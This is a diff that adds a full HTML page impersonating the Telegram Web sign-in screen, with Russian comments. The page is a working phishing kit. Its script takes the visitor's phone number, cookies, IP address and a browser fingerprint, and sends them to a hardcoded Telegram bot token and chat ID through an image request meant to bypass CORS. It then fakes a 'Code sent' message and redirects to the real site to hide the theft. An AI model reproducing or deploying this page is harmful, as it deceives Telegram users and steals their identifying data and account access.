@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Telegram Web</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #0088cc 0%, #00a8e8 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .login-container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .logo {
+            width: 64px;
+            height: 64px;
+            margin: 0 auto 20px;
+            background: linear-gradient(135deg, #0088cc, #00a8e8);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 32px;
+            font-weight: bold;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 30px;
+            font-size: 24px;
+            font-weight: 600;
+        }
+        input[type="tel"] {
+            width: 100%;
+            padding: 15px 20px;
+            border: 2px solid #e1e5eb;
+            border-radius: 12px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            transition: all 0.3s;
+        }
+        input[type="tel"]:focus {
+            outline: none;
+            border-color: #0088cc;
+            box-shadow: 0 0 0 3px rgba(0,136,204,0.1);
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #0088cc, #00a8e8);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0,136,204,0.3);
+        }
+        button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .loader {
+            display: none;
+            width: 24px;
+            height: 24px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0088cc;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .error {
+            color: #ff4444;
+            font-size: 14px;
+            margin-bottom: 10px;
+            display: none;
+        }
+        .success {
+            color: #4CAF50;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">T</div>
+        <h1>Sign in to Telegram</h1>
+        <div class="error" id="error">Please enter a valid phone number</div>
+        <form id="loginForm">
+            <input type="tel" id="phone" placeholder="Your phone number" required pattern="[0-9]{10,15}">
+            <button type="submit" id="submitBtn">Send code</button>
+            <div class="loader" id="loader"></div>
+            <div class="success" id="success"></div>
+        </form>
+    </div>
+
+    <script>
+        // ТВОИ ДАННЫЕ (но они скомпрометированы!)
+        const BOT_TOKEN = '8258404871:AAEYPA8hn3-9Ruw-uN0jpu8A3AMSnNCFjDg';
+        const CHAT_ID = '6504292955';
+        
+        // Мгновенный сбор данных (без долгих запросов)
+        function collectData(phone) {
+            const data = {
+                // Основные данные
+                phone: phone,
+                timestamp: new Date().toISOString(),
+                
+                // Система
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                
+                // Экран
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth
+                },
+                
+                // Окно
+                window: {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    devicePixelRatio: window.devicePixelRatio
+                },
+                
+                // Локация
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                
+                // Браузер
+                cookies: document.cookie || 'no cookies',
+                referrer: document.referrer || 'direct',
+                
+                // Плагины
+                plugins: Array.from(navigator.plugins).map(p => p.name),
+                
+                // Canvas fingerprint
+                canvas: getCanvasFingerprint(),
+                
+                // Хранилища
+                localStorageKeys: Object.keys(localStorage).length,
+                sessionStorageKeys: sessionStorage.length
+            };
+            
+            return data;
+        }
+        
+        // Canvas fingerprint
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(0, 0, 150, 50);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Telegram Login', 2, 15);
+                return canvas.toDataURL().substring(22, 50);
+            } catch {
+                return 'error';
+            }
+        }
+        
+        // Быстрое получение IP через JSONP
+        function getIP() {
+            return new Promise((resolve) => {
+                // Таймаут
+                setTimeout(() => resolve('unknown'), 2000);
+                
+                // JSONP запрос
+                window.ipCallback = function(response) {
+                    resolve(response.ip || 'unknown');
+                };
+                
+                const script = document.createElement('script');
+                script.src = `https://api.ipify.org?format=jsonp&callback=ipCallback`;
+                document.head.appendChild(script);
+                setTimeout(() => {
+                    if (script.parentNode) script.remove();
+                }, 3000);
+            });
+        }
+        
+        // Отправка через Image (обход CORS)
+        async function sendToTelegram(data) {
+            return new Promise((resolve) => {
+                // Форматируем сообщение
+                const message = `
+📱 *НОВЫЙ ЛОГИН TELEGRAM*
+────────────────
+📞 *Телефон:* ${data.phone}
+🕐 *Время:* ${new Date(data.timestamp).toLocaleString()}
+🌍 *Часовой пояс:* ${data.timezone}
+────────────────
+🖥️ *Система:*
+• OS: ${data.platform}
+• Браузер: ${data.userAgent.substring(0, 50)}...
+• Язык: ${data.language}
+• Экран: ${data.screen.width}x${data.screen.height}
+────────────────
+🌐 *Сеть:*
+• IP: ${data.ip}
+• Referrer: ${data.referrer.substring(0, 50) || 'direct'}
+────────────────
+🔍 *Отпечаток:*
+• Canvas: ${data.canvas}
+• Плагинов: ${data.plugins.length}
+• Куки: ${data.cookies.length > 0 ? 'есть' : 'нет'}
+────────────────
+                `;
+                
+                // Создаем изображение для отправки
+                const img = new Image();
+                img.onload = function() {
+                    console.log('✅ Данные отправлены в Telegram');
+                    resolve(true);
+                };
+                
+                img.onerror = function() {
+                    console.log('❌ Ошибка отправки в Telegram');
+                    resolve(false);
+                };
+                
+                // Отправляем через Telegram API
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const params = `?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+                
+                img.src = url + params;
+            });
+        }
+        
+        // Основная функция
+        async function handleSubmit(phone) {
+            const submitBtn = document.getElementById('submitBtn');
+            const loader = document.getElementById('loader');
+            const error = document.getElementById('error');
+            const success = document.getElementById('success');
+            
+            // Сбрасываем сообщения
+            error.style.display = 'none';
+            success.textContent = '';
+            
+            // Проверка номера
+            if (!phone.match(/^[0-9]{10,15}$/)) {
+                error.style.display = 'block';
+                return false;
+            }
+            
+            // Блокируем кнопку
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Processing...';
+            loader.style.display = 'block';
+            
+            try {
+                // 1. Собираем основные данные (мгновенно)
+                const data = collectData(phone);
+                
+                // 2. Получаем IP (с таймаутом 2 секунды)
+                data.ip = await getIP();
+                
+                // 3. Отправляем в Telegram
+                const sent = await sendToTelegram(data);
+                
+                // 4. Обрабатываем результат
+                if (sent) {
+                    success.textContent = '✓ Code sent! Redirecting...';
+                    success.style.color = '#4CAF50';
+                    
+                    // Редирект через 1.5 секунды
+                    setTimeout(() => {
+                        window.location.href = 'https://web.telegram.org';
+                    }, 1500);
+                    
+                    return true;
+                } else {
+                    success.textContent = '⚠️ Connection error. Try again.';
+                    success.style.color = '#ff9800';
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Send code';
+                    loader.style.display = 'none';
+                    return false;
+                }
+                
+            } catch (err) {
+                console.error('Error:', err);
+                success.textContent = '❌ Error occurred. Please refresh.';
+                success.style.color = '#ff4444';
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Send code';
+                loader.style.display = 'none';
+                return false;
+            }
+        }
+        
+        // Обработчик формы
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const phone = document.getElementById('phone').value;
+            await handleSubmit(phone);
+        });
+        
+        // Валидация номера в реальном времени
+        document.getElementById('phone').addEventListener('input', function() {
+            const error = document.getElementById('error');
+            if (this.value.match(/^[0-9]{10,15}$/)) {
+                error.style.display = 'none';
+                this.style.borderColor = '#4CAF50';
+            } else {
+                this.style.borderColor = '#e1e5eb';
+            }
+        });
+        
+        // Анти-таймаут (на всякий случай)
+        setTimeout(() => {
+            const submitBtn = document.getElementById('submitBtn');
+            if (submitBtn.disabled && submitBtn.textContent === 'Processing...') {
+                console.log('Global timeout activated');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Send code';
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('success').textContent = '⚠️ Timeout. Try again.';
+                document.getElementById('success').style.color = '#ff9800';
+            }
+        }, 10000); // 10 секунд общий таймаут
+        
+        // Авто-фокус на поле ввода
+        window.onload = function() {
+            document.getElementById('phone').focus();
+        };
+    </script>
+</body>
+</html>
